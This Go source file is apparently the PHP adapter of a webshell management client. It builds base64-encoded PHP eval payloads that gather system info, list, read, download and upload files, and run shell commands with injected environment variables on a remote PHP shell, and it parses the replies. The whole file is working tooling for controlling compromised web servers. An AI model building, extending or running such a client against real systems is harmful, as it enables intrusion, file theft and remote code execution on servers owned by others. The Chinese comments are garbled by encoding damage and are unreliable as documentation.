package php

import (
	"context"
	"errors"
	"strconv"
	"strings"

	"github.com/Yliken/redbeanshellcore/core"
)

// phpInfo �� Info ������ PHP �������汾��
//
//	core �� ops.InfoOperation ֻ������һ������ payload���� PHP Shell �����á���
//	PHP Shell ʵ����Ҫ eval һ�� PHP ��������õ�ϵͳ��Ϣ��
//	������ PHPTemplates ����������ִ�е�Դ�벢д�� payload��
type phpInfo struct {
	tpl *PHPTemplates
}

// NewPhpInfo ����һ�� PHP ���ݵ� Info ������
func NewPhpInfo() *phpInfo { return &phpInfo{tpl: NewPHPTemplates()} }

func (p *phpInfo) Name() string { return "info" }

func (p *phpInfo) RiskLevel() core.RiskLevel { return core.RiskReadOnly }

// Build �����ģ����Ⱦ��������ʵ PHP Դ�롣
func (p *phpInfo) Build(_ context.Context, sess *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	code, _ := p.tpl.Info()
	req.Payload = []byte(code)
	req.Meta["adapter"] = "php"
	_ = sess
	return req, nil
}

func (p *phpInfo) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil {
		return nil, errors.New("phpInfo.Parse: ��ӦΪ��")
	}
	return parseInfo(string(resp.Body), resp.Body), nil
}

// phpFileList �� FileList ������ PHP �������汾��
type phpFileList struct {
	tpl    *PHPTemplates
	target string
}

// NewPhpFileList ����һ�� FileList ������
func NewPhpFileList(path string) *phpFileList {
	if path == "" {
		path = "/"
	}
	return &phpFileList{tpl: NewPHPTemplates(), target: path}
}

func (p *phpFileList) Name() string { return "file.list" }

func (p *phpFileList) RiskLevel() core.RiskLevel { return core.RiskReadOnly }

func (p *phpFileList) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	code, placeholders := p.tpl.FileList()
	bindBase64Path(req, placeholders, p.target)
	req.Payload = []byte(code)
	req.Meta["adapter"] = "php"
	return req, nil
}

func (p *phpFileList) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil {
		return nil, errors.New("phpFileList.Parse: ��ӦΪ��")
	}
	if err := parseRemoteError(p.Name(), resp); err != nil {
		return nil, err
	}
	return parseFileList(p.target, resp.Body), nil
}

// phpFileRead �� FileRead ������ PHP �������汾��
type phpFileRead struct {
	tpl    *PHPTemplates
	target string
}

// NewPhpFileRead ����һ�� FileRead ������
func NewPhpFileRead(path string) *phpFileRead {
	return &phpFileRead{tpl: NewPHPTemplates(), target: path}
}

func (p *phpFileRead) Name() string { return "file.read" }

func (p *phpFileRead) RiskLevel() core.RiskLevel { return core.RiskReadOnly }

func (p *phpFileRead) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	code, placeholders := p.tpl.FileRead()
	bindBase64Path(req, placeholders, p.target)
	req.Payload = []byte(code)
	req.Meta["adapter"] = "php"
	return req, nil
}

func (p *phpFileRead) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil {
		return nil, errors.New("phpFileRead.Parse: ��ӦΪ��")
	}
	if err := parseRemoteError(p.Name(), resp); err != nil {
		return nil, err
	}
	return parseFileRead(p.Name(), p.target, resp.Body), nil
}

// phpFileDownload �� FileDownload ������ PHP �������汾��
type phpFileDownload struct {
	tpl    *PHPTemplates
	target string
}

// NewPhpFileDownload ����һ�������ư�ȫ�� PHP FileDownload ������
func NewPhpFileDownload(path string) *phpFileDownload {
	return &phpFileDownload{tpl: NewPHPTemplates(), target: path}
}

func (p *phpFileDownload) Name() string { return "file.download" }

func (p *phpFileDownload) RiskLevel() core.RiskLevel { return core.RiskReadOnly }

func (p *phpFileDownload) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	code, placeholders := p.tpl.FileDownload()
	bindBase64Path(req, placeholders, p.target)
	req.Payload = []byte(code)
	req.Meta["adapter"] = "php"
	return req, nil
}

func (p *phpFileDownload) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil {
		return nil, errors.New("phpFileDownload.Parse: ��ӦΪ��")
	}
	if err := parseRemoteError(p.Name(), resp); err != nil {
		return nil, err
	}
	return parseFileRead(p.Name(), p.target, resp.Body), nil
}

// phpFileUpload �� FileUpload ������ PHP �������汾��
// ���԰��������� remote_path �� file_content �� base64 ������ PHP Դ���
// ����Զ�� eval ����д���ļ����������κ��ⲿ POST �ֶΡ�
type phpFileUpload struct {
	tpl     *PHPTemplates
	remote  string
	content []byte
	append  bool
}

// NewPhpFileUpload ����һ�� PHP ���ݵ� FileUpload ������
func NewPhpFileUpload(remotePath string, content []byte) *phpFileUpload {
	return &phpFileUpload{
		tpl:     NewPHPTemplates(),
		remote:  remotePath,
		content: content,
		append:  false,
	}
}

func (p *phpFileUpload) Name() string { return "file.upload" }

func (p *phpFileUpload) RiskLevel() core.RiskLevel { return core.RiskWrite }

// WithAppend �л�Ϊ׷��ģʽ��Ĭ�ϸ��ǣ���
func (p *phpFileUpload) WithAppend(on bool) *phpFileUpload {
	p.append = on
	return p
}

func (p *phpFileUpload) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	code, placeholders := p.tpl.FileUpload()
	flag := "w"
	if p.append {
		flag = "a"
	}
	code = strings.Replace(code, `"w"`, `"` + flag + `"`, 1)
	for key, ph := range placeholders {
		switch ph {
		case placeholderBase64Path:
			req.SetParam(key, []byte(b64(p.remote)))
		case placeholderBase64Content:
			req.SetParam(key, []byte(b64(string(p.content))))
		}
	}
	req.Payload = []byte(code)
	req.Meta["adapter"] = "php"
	return req, nil
}
func (p *phpFileUpload) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil {
		return nil, errors.New("phpFileUpload.Parse: ��ӦΪ��")
	}
	trimmed := string(resp.Body)
	ok := trimmed == "1" || trimmed == "ok"
	return &core.BoolResult{
		BaseResult: core.NewBaseResult("file.upload", resp.Body),
		OK:         ok,
		Message:    trimmed,
	}, nil
}

// phpExec �� Exec ������ PHP �������汾��
type phpExec struct {
	tpl    *PHPTemplates
	cmd    string
	bin    string
	envars map[string]string
}

// NewPhpExec ����һ�� PHP ���ݵ� Exec ������
func NewPhpExec(cmd string) *phpExec {
	return &phpExec{tpl: NewPHPTemplates(), cmd: cmd, bin: "/bin/sh"}
}

func (p *phpExec) Name() string { return "exec" }

func (p *phpExec) RiskLevel() core.RiskLevel { return core.RiskExec }

func (p *phpExec) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	code, placeholders := p.tpl.Exec()
	for key, ph := range placeholders {
		switch ph {
		case placeholderBase64Bin:
			req.SetParam(key, []byte(b64(p.bin)))
		case placeholderBase64Cmd:
			req.SetParam(key, []byte(b64(p.cmd)))
		case placeholderBase64Env:
			envStr := ""
			if len(p.envars) > 0 {
				seps := NewSeparators()
				var pairs []string
				for k, v := range p.envars {
					pairs = append(pairs, k+seps.KeySep+v)
				}
				envStr = joinLines(pairs, seps.LineSep)
			}
			req.SetParam(key, []byte(b64(envStr)))
		}
	}
	req.Payload = []byte(code)
	req.Meta["adapter"] = "php"
	return req, nil
}
func (p *phpExec) WithBin(bin string) *phpExec {
	p.bin = bin
	return p
}

// WithEnv ׷��ע��Ļ���������
func (p *phpExec) WithEnv(key, value string) *phpExec {
	if p.envars == nil {
		p.envars = make(map[string]string)
	}
	p.envars[key] = value
	return p
}

func (p *phpExec) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil {
		return nil, errors.New("phpExec.Parse: ��ӦΪ��")
	}
	return parseExec(resp.Body), nil
}

// �����Ǹ��ֲ����Ľ����߼���

func parseInfo(raw string, body []byte) core.Result {
	parts := splitTab(raw)
	res := &core.InfoResult{BaseResult: core.NewBaseResult("info", body)}
	switch {
	case len(parts) >= 4:
		res.Workdir = parts[0]
		// parts[1] ���������б����Ѱ����� Raw ��
		res.OS = parts[2]
		res.User = parts[3]
	case len(parts) >= 1:
		res.OS = parts[0]
	}
	return res
}

func parseFileList(target string, body []byte) core.Result {
	lines := splitLines(string(body))
	var entries []core.FileEntry
	for _, line := range lines {
		line = trimRight(line, "\t\n")
		if len(line) == 0 {
			continue
		}
		name, rest, ok := cutTab(line)
		if !ok {
			continue
		}
		detail := splitTab(rest)
		if len(detail) < 3 {
			continue
		}
		// detail[0]=modtime, [1]=size, [2]=mode
		entries = append(entries, core.FileEntry{
			Name:  name,
			IsDir: suffix(name, "/"),
		})
	}
	return &core.FileListResult{
		BaseResult: core.NewBaseResult("file.list", body),
		Path:       target,
		Entries:    entries,
	}
}

func parseFileRead(operation, target string, body []byte) core.Result {
	data := make([]byte, len(body))
	copy(data, body)
	return &core.FileReadResult{
		BaseResult: core.NewBaseResult(operation, body),
		Path:       target,
		Data:       data,
	}
}

func parseExec(body []byte) core.Result {
	out := &core.ExecResult{
		BaseResult: core.NewBaseResult("exec", body),
		Stdout:     string(body),
	}
	// Զ��ģ���ڷ����˳���ʱ��β��׷�� "ret=<n>"�������������� ExitCode��
	//   ע�� stderr ��ͨ�� 2>&1 �ϲ��� stdout������ֻ��ȡ�˳��롣
	const prefix = "ret="
	s := string(body)
	if idx := strings.LastIndex(s, prefix); idx >= 0 {
		codeStr := strings.TrimSpace(s[idx+len(prefix):])
		if code, err := strconv.Atoi(codeStr); err == nil {
			out.ExitCode = code
			// �� Stdout ��ȥ��β�� ret=<n>����������ɾ���
			out.Stdout = strings.TrimSpace(s[:idx])
		}
	}
	return out
}

// ���ߺ�����Ϊ���԰���д������������������

func splitTab(s string) []string {
	var out []string
	cur := ""
	for _, r := range s {
		if r == '\t' {
			out = append(out, cur)
			cur = ""
			continue
		}
		cur += string(r)
	}
	out = append(out, cur)
	return out
}

func splitLines(s string) []string {
	var out []string
	cur := ""
	for _, r := range s {
		if r == '\n' {
			out = append(out, cur)
			cur = ""
			continue
		}
		if r == '\r' {
			continue
		}
		cur += string(r)
	}
	if cur != "" {
		out = append(out, cur)
	}
	return out
}

func cutTab(s string) (string, string, bool) {
	for i, r := range s {
		if r == '\t' {
			return s[:i], s[i+1:], true
		}
	}
	return "", "", false
}

func trimRight(s string, cuts string) string {
loop:
	for len(s) > 0 {
		c := s[len(s)-1:]
		for _, r := range cuts {
			if string(r) == c {
				s = s[:len(s)-1]
				continue loop
			}
		}
		return s
	}
	return s
}

func suffix(s, suf string) bool {
	return len(s) >= len(suf) && s[len(s)-len(suf):] == suf
}

func joinLines(parts []string, sep string) string {
	out := ""
	for i, p := range parts {
		if i > 0 {
			out += sep
		}
		out += p
	}
	return out
}

func replaceAll(s, old, new string) string {
	if old == "" {
		return s
	}
	out := ""
	for {
		idx := indexOf(s, old)
		if idx < 0 {
			return out + s
		}
		out += s[:idx] + new
		s = s[idx+len(old):]
	}
}

func indexOf(s, sub string) int {
	if sub == "" {
		return 0
	}
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}

func bindBase64Path(req *core.Request, placeholders map[string]string, path string) {
	encoded := []byte(b64(path))
	for key, placeholder := range placeholders {
		if placeholder == placeholderBase64Path {
			req.SetParam(key, encoded)
		}
	}
}

func b64(s string) string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	if s == "" {
		return ""
	}
	var out []byte
	b := []byte(s)
	n := len(b)
	for i := 0; i < n; i += 3 {
		var v, pad int
		switch {
		case i+2 < n:
			v = int(b[i])<<16 | int(b[i+1])<<8 | int(b[i+2])
		case i+1 < n:
			v = int(b[i])<<16 | int(b[i+1])<<8
			pad = 1
		default:
			v = int(b[i]) << 16
			pad = 2
		}
		out = append(out, chars[(v>>18)&63])
		out = append(out, chars[(v>>12)&63])
		if pad < 2 {
			out = append(out, chars[(v>>6)&63])
		} else {
			out = append(out, '=')
		}
		if pad < 1 {
			out = append(out, chars[v&63])
		} else {
			out = append(out, '=')
		}
	}
	return string(out)
}
